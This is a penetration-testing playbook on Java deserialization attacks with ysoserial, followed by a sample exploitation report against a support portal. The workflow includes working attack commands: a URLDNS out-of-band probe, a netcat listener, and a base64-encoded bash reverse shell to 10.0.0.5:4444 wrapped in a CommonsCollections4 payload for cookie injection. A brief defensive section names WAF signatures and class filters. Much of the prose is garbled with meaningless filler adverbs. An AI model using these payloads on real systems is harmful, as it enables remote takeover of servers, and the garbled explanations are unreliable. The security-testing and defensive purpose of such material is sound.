# Java Insecure Deserialization (`ysoserial`)

## When to Use
- When discovering a Java-based web application (e.g., WebLogic, JBoss, Tomcat) natively accepting arbitrary Base64-encoded strings beginning with `rO0AB...` or raw binary streams containing the hex magic bytes `AC ED 00 05`.
- During an advanced Black-box penetration test when simplistic web vulnerabilities (XSS/SQLi) are absent, and you require definitive Remote Code Execution (RCE) terminating directly traversing deep server-side logic fundamentally.
- To execute out-of-band (OOB) blindness testing leveraging DNS interactions inherently verifying that the backend architecture is systematically parsing and executing Java objects implicitly.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying Java Serialized Objects (The Signatures)

```text
# Concept: Serialization explicitly converts a complex Java Object (e.g., a 'User' class 
# containing a username, ID, and permissions) perfectly into a flat byte stream identically. 
# Deserialization converts that stream aggressively back into a living Object in the server's RAM.
# If the server deserializes any object provided by the user without validation, RCE occurs natively.

# 1. Base64 Encoded Format (Common in Cookies or Hidden Form Fields)
# Encoded String: `rO0ABXNyAA5qYXZhLmxhbmcu...`
# - `rO0AB` is the hallmark Base64 encoding exclusively translating the raw Java magic bytes.

# 2. Raw Binary / Hex Format (Common in raw TCP sockets or custom API calls)
# Magic Bytes: `AC ED 00 05`
# - Identifies the ObjectOutputStream natively written seamlessly utilizing the JVM protocol.
```

### Phase 2: Understanding Gadget Chains

```text
# Concept: We fundamentally cannot instruct the server to simply `Runtime.exec("calc.exe")` 
# utilizing a custom class because the server lacks our custom class in its classpath. 
# We MUST explicitly construct a "Gadget Chain" - a highly complex sequence of deeply nested, 
# pre-existing classes already natively available identically on the remote server (e.g., 
# vulnerable versions of Apache CommonsCollections, Spring, Hibernate, Groovy).

# `ysoserial` automates the grueling task of precisely aligning these gadget chains perfectly 
# formulating our explicit command.
```

### Phase 3: Out-of-Band (OOB) Testing (Blind Identification)

```bash
# Concept: Standard RCE via deserialization is almost fundamentally blind. We will not receive 
# a response confirming the execution natively. We must compel the server to physically execute 
# a DNS Ping unequivocally proving execution.

# 1. Generate an OOB URL utilizing Burp Collaborator or interact.sh
# URL: `vulnerable123.burpcollaborator.net`

# 2. Generate a `URLDNS` payload utilizing ysoserial.
# The `URLDNS` chain inherently exists systematically within the core Java standard library (JRE), 
# identically guaranteeing execution without relying on third-party vulnerable dependencies.
java -jar ysoserial.jar URLDNS "http://vulnerable123.burpcollaborator.net" > payload_urldns.bin

# 3. Base64 Encode the resulting binary blob for HTTP transport.
cat payload_urldns.bin | base64 -w0

# 4. Inject the `rO0AB...` Base64 string directly into the vulnerable HTTP Cookie parameter.
# If your Collaborator server receives an active DNS resolution query originating inherently 
# from the target application server, Java Deserialization is absolutely confirmed securely.
```

### Phase 4: Remote Code Execution (The RCE Payload)

```bash
# Concept: We have proven the vulnerability exists explicitly. Now we iterate through massive 
# third-party Gadget Chains (CommonsCollections1 through 7, etc.) attempting to force 
# systematic OS-level command execution identically.

# 1. Start a Netcat listener aggressively on your attacker machine (Port 4444).
nc -lvnp 4444

# 2. Formulate the explicit Reverse Shell command natively bypassing Java's strict `Runtime.exec` 
# String Tokenizer parsing limitations.
# Payload: `bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}`

# 3. Generate the Malignant Serialized Object utilizing the `CommonsCollections4` gadget chain natively.
java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}' > exploit.bin
cat exploit.bin | base64 -w0

# 4. Inject the finalized payload systematically into the vulnerable Parameter (e.g., the `ViewState` variable or Authentication Cookie).
# 5. Receive the root Reverse Shell identically terminating unequivocally on the Netcat listener!
```

## 🔵 Blue Team Detection & Defense
- **Implement Java ObjectInputFilters**: Modern Java (JDK 9+) absolutely provides intrinsic Deserialization whitelisting architectures (`java.io.ObjectInputFilter`). Explicitly define an aggressive, mandatory Look-Ahead list rejecting any class intrinsically not exclusively developed by the organization natively prior to any instantiation implicitly. A systemic refusal of classes identically like `org.apache.commons.collections.*` fundamentally eradicates Gadget Chain execution natively.
- **Aggressive WAF Signatures**: Disallow the systemic transmission of arbitrary serialized objects horizontally across Web parameters. Configure identical Cloudflare WAF patterns unequivocally blocking any HTTP POST, GET, or Cookie parameters beginning synchronously with the `rO0AB` Base64 string implicitly, or containing the `AC ED 00 05` sequence entirely within raw API inputs natively.
- **Architectural Refactoring (JSON/Protocol Buffers)**: Fundamentally prohibit developers from identically utilizing native Java Serialization architectures (`java.io.Serializable`) mandate the exclusive integration of structured, strictly typed data formats natively like JSON (utilizing secure, type-safe Jackson configurations natively avoiding polymorphic instantiation securely) identically ensuring structural integrity securely.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Deserialization | The intrinsically volatile process of explicitly rebuilding a complex language-specific data structure seamlessly from an abstract, flat sequence of bytes natively supplied horizontally by a client |
| Gadget Chain | A sophisticated, highly technical sequence inherently combining various seemingly harmless code fragments natively residing deeply within a vulnerable, third-party library identically (e.g., Apache Commons) systematically triggering a devastating RCE unequivocally during the instantiation lifecycle organically |
| ysoserial | The premier, foundational exploitation toolkit exclusively designed generating immense arrays of customized Java Gadget Chains natively demonstrating arbitrary command execution implicitly |
| Magic Bytes (`AC ED 00 05`) | The absolutely unique, permanent hexadecimal signature definitively identifying the beginning of a native Java Serialized Object stream intuitively |

Advanced Exploitation Report: Remote Code Execution via Java Deserialization
=============================================================================
Vulnerability: Insecure Deserialization (OWASP A08:2021)
Exploitation Tool: `ysoserial` / `URLDNS` / `CommonsCollections5`
Severity: Critical (CVSS 9.8)

Description:
The primary customer support portal (`https://support.corp.com`) natively utilizes entirely unvalidated Java Deserialization intrinsically managing user session persistence. 

Upon successful login intuitively, the application universally sets a monolithic HTTP Cookie explicitly named `UserSessionState`. Extensive analysis identified the precise Base64 encoded payload originating completely with the structural `rO0AB...` string confirming native structural Java serialized data implicitly.

Attacking Methodology:
1. Conducted Out-of-Band (OOB) validation natively generating a foundational `URLDNS` object seamlessly querying the Red Team infrastructure. The server identically executed the resolution implicitly confirming absolute susceptibility systematically.
2. Compiled a highly sophisticated Reverse Shell command bypassing execution limitations utilizing `ysoserial`.
3. Executed a comprehensive Gadget Chain enumeration seamlessly isolating specifically that the backend application universally integrated a highly vulnerable version natively spanning `Apache Commons Collections 5`.
4. The Base64 encoded payload identical stream explicitly forced the JVM launching `/bin/bash` communicating back to the Red Team's Netcat listener implicitly.

Impact:
The adversary natively possesses absolute, uninhibited systemic `root` command execution exclusively manipulating the foundational Linux application server implicitly. Complete compromise seamlessly achieved identically.
